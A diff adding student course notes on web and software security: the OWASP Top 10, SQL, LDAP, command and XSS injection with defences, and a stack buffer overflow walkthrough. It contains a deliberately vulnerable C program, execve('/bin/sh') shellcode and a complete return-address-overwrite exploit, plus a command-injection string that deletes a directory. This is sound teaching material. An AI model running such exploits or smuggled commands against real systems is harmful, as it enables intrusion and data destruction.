@@ -2151,3 +2151,236 @@ Do modern programming languages provide full guarantee for thread safety?
 **Exercise 5.10**
 Explain the principle of least privilege, sandboxing, and compartmentalization in your own words.
 Show how they relate to each other.
+
+## Web and software security
+
+CVE - unique identifier for a vulnerability (vunerabilities and exposures)
+CWE - unique identifier for a class of vulnerabilities (weakness enumeration)
+
+### OWASP Top 10
+
+1. Broken access control
+   1. failures lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits
+   2. CWEs: exposure of sensitive information to an unauthorized actore, Insertion of sensitive information into sent data, cross-site request forgery
+   3. Solutions - reduce attack surface by "deny by default", log access control failures, and rate limit API calls.
+   4. Difficulty - keeping track of what you have installed and that it does not allow escalation of access.
+2. Cryptographic failures
+   1. CWEs: Use of hard-coded ("default") password, Broken or Risky Crypto algorithm, Insufficient Entropy
+   2. Solutions: reduce attack surface by storeing minimal data
+   3. Ensure up-to-date algorithms and implementations
+   4. Disable legacy protocols
+3. Injection
+   1. It is possilbe when attacker controlled data is handled incorrectly and ends up being parsed as code.
+   2. CWEs: XSS, SQL injection, External control of file name or path
+   3. Solutions: reduce attack surface by shifting to safe API, sanitize user input through validation and escaping , validate input whenever possible, escape remaining characters when necessary.
+   4. It is extremely difficult to detect that on the browser/user side, because websites already use a lot of resources from other websites
+4. Insecure design
+   1. it is broad category representing different weaknesses.
+   2. CWEs: Generation of Error Message containing sensitive information, Unprotected storage of credentials, Trust boundary violation, Insufficiently protected credentials.
+   3. Solutions: prevent by establishing secure development lifecycle, use threat modeling where feasible, segregate and compartmentalize where possible
+5. Security Misconfiguration
+   1. Admins need to carefully balance features and security. Any software along a complex stack may be misconfigured.
+   2. CWEs: Configuration, Improper restriction of XML external entity reference
+   3. E.g. configuring email server
+   4. Solutions: document the software stack and its configuration, harden all configuration, minimize exposed features.
+6. Vulnerable/Outdated Components
+   1. software built on top of bigger components (wordpress) and keep those updates coming
+   2. CWE: Use of unmaintained third-party components
+   3. Reasons why this is not done: code deprecation, dependency management is hard, certification, new stuff can be broken.
+   4. Solution: minimize attack surface, track inventory of software and follow upstream security notices, monitor for available patches (if patching is not possible mitigate through firewall or high-level interception)
+7. Identification / Authentication failures
+   1. CWEs: Improper validation of certificate with host mismatch, Improper authentication, Session fixation
+   2. Solution: reduce attack surface through 2FA, Check for good password hygiene, Limit or increasingly delay failed login attempts (and don't create your own policy)
+   3. Forcing to change the password (every 6 months) does not protect from phishing because the timeframe is way too big.
+8. Software and data integrity failures
+   1. E.g. application relies on plugins, libraries or modules from untrusted sources, repositories and content delivery networks (CDNs)
+   2. CWEs: Inclusion of functionality from untrusted control sphere, Download code without integrity check
+   3. Solution: Mitigate by verifying (through signatures) that data comes from verified source, review code and configuration changes
+9. Security and loggin monitoring
+   1. Since breaches happen, document ongoing secuirty activities and safely log actions to enable detection and analysis of breaches
+   2. CWEs: insufficient logging, imporper output neetralization for logs, etc
+   3. Solutions: mitigate by logging failed logins, ensure high value transations have an audit file
+10. Server side request forgery
+    1. SSRF occurs whenever a web application is fetchin a remote resource without validating the user-supplied URL. It basically get a server to do something it shouldn't do. Also called "Confused deputy attack"
+    2. Solutions: prevent by implementing defence in depth
+
+### Arbitrary code execution
+
+It is possible when user-supplied data escapes control
+
+Example contexts: HTML, SQL, LDAP, OS commands, XML, etc
+
+Vulnerability - special characters in user inputs can trigger an action in the context
+
+#### SQL injection
+
+Happens when the SQL characters are escaped.
+
+One of the problems: no input sanitization, so an escape character can be used.
+
+So the attacker controls whatever is inserted between the quotes, and therefore it can escape them and add additional code to execute in the database
+
+LDAP, XSS is same principle
+
+#### LDAP pnjection
+
+Lightweight directory access protocol is used to query directories
+
+It is possible to inject data by changing the meaning of the data by adding conditions by guessing the structure of LDAP query and overcome the password.
+
+Happened for Joomla, and Log4J (library used in a lot of software).
+
+#### Command injection
+
+Since the code uses concatination, more commands can be added with special chars (e.g. "photo & rmdir /s /q photo" when opening the dir)
+Similar thing happened to iOS.
+
+#### XSS
+
+Javascript code injection into web pages
+
+Impact: Steal session cookies, Display forged forms, Complete control over webpage.
+
+Mitigation strategy is to replace special chars (e.g. "<,>")
+
+Types:
+
+- Reflected - Attack is sent in the request and reflected in the response
+- Stored - attack is stored on the server (e.g. XSS on the forum post)
+- DOM-based - attack happens on the client side
+
+#### Protection against injection
+
+Deny by default, otherwise inspect received data twice
+
+When receiving - input validation
+
+e.g.:
+
+```javascript
+if (!Regex.IsMatch(txtName.Text,
+ @"^[a-zA-Z'.-]{1,40}$")) {
+ abort()
+}
+```
+
+When using - Encode data
+
+- Escape (encode) special characters when you use them
+- In SQL: ‘ becomes \’
+- In HTML: <,> becomes &lt; &gt;
+- In LDAP: (,) becomes \28, \29
+
+SQL injection protection: use prepared statements instead of concatenating. (this is separation of control and data)
+
+### Software security
+
+All software will have bugs. Some of the bugs can be exploitable.
+
+In the stack right next to each other we have data and the pointer which controls the execution of the program. Therefore an attacker can exploit this.
+
+#### Buffer overflows
+
+Vulnerable program: `strcpy` call copies a string into the buffer on the stack, potentially past the end of `cookie`.
+
+```C
+int main(int argc, char* argv[]) {
+  char authorized = 0;
+  char cookie[31];
+  if (getenv("AUTH") != NULL && strcmp(getenv("AUTH"), "MAGIC") == 0)
+  authorized = 1;
+  printf("Give me a cookie ( %p, %p)\n", cookie, getenv("EGG"));
+  strcpy(cookie, argv[1]);
+  printf("Thanks for the %s\n", cookie);
+  if (authorized) {
+  printf("Congratulations, you are authorized! \n");
+  }
+  return 0;
+}
+```
+
+It is possible to check mitigations with `checksec`
+
+`cookie` is 31 byte buffer, after which there is authorized bool and return address. Strcpy is not checking how much data it is copying (copies everything before '\n')
+
+This means that we can inject code into the address space and set the return address to the address of the injected shellcode.
+
+```C
+int shell() {
+asm("\
+needle: jmp gofar \n\
+goback: pop %rdi \n\
+ xor %rax, %rax \n\
+ movb $0x3b, %al \n\
+ xor %rsi, %rsi \n\
+ xor %rdx, %rdx \n\
+ syscall \n\
+gofar: call goback \n\
+.string \"/bin/sh\"\n\
+");
+}
+```
+
+`call` puts the return address to the stack and therefore the syscall uses the string argument.
+
+**Exploit**:
+
+```C
+#define BUFSIZE 0x20
+#define EGGLOC 0x7fffffffefd3
+  int main(int argc, char* argv[]) {
+  char shellcode[] = "EGG="
+  "\xeb\x0e" // jump +0xe (+14)
+  "\x5f" // pop %rdi
+  "\x48\x31\xc0" // xor %rax, %rax
+  "\xb0\x3b" // mov $0x3b, %al
+  "\x48\x31\xf6" // xor %rsi, %rsi
+  "\x48\x31\xd2" // xor %rdx, %rdx
+  "\x0f\x05" // syscall
+  "\xe8\xed\xff\xff\xff\x2f " // call 0xed (-19)
+  "\x62\x69\x6e\x2f\x73\x68\x00\x5d "; // /bin/bash+\0
+  char buf[256]; // buffer used for overflow
+  for (int i = 0; i <BUFSIZE+sizeof(void*); buf[i++] = 'A'); // fill buffer + rbp
+  char **buff = (char**)(&buf[BUFSIZE+sizeof(void*)]); // overwrite RIP
+  *(buff++) = ( void*)EGGLOC;
+  *buff = ( void*)0x0;
+  char *args[3] = { "./stack", buf, NULL }; // execution environment
+  char *envp[2] = { shellcode, NULL};
+  execve("./stack", args, envp); // fire exploit!
+  return 0;
+}
+```
+
+#### Mitigations
+
+This program violates:
+
+- memory safety: stop memory corruption - safe C/C++ dialects (CCured, Cyclone), rewrite in safe lang
+- Integrity: Enforce integrity of reads/writes
+- Randomization: Randomize locations, code, data, or pointer values
+- Flow integrity: Protect control transfers - data-flow integrity, control-flow integrity
+
+#### Defense strategies
+
+**Data execution prevention (DEP)** - distinguish code and data and prohibit the attacker from ijecting code.
+Problem - ISAs (e.g. x86, ARM) did not distinguish code and data
+
+DEP hardware support - page table extension, introduce NX-bt (No eXecute bit).
+Intel - per-page bit XD
+AMD - Enhanced Virus Protetion
+ARM - XN
+thsis is an addtional bit for every mapped virtual page.
+
+Attacker can still control pointers.
+
+**ASLR - Address Space Layout Randomization**
+ASLR focuses on blocks of memory (i.e., it is coarse grained)
+Heap, stack, code, executable, mmap regions end up at random addresses
+ASLR is inherently page-based, limiting cost of shuffling
+Initialized when process starts (never re-randomized)
+
+**Stack canaries (stack protector)**
+Before we return from the function we check if the canary is still alive. This canary is placed before the return value in the function which is a magic value.
+This allows us to protect RIP control-flow attacks.
+Key limitation - only protects from continuous overwrites if (and only if) the attacker does not know the canary
+Low overhead.
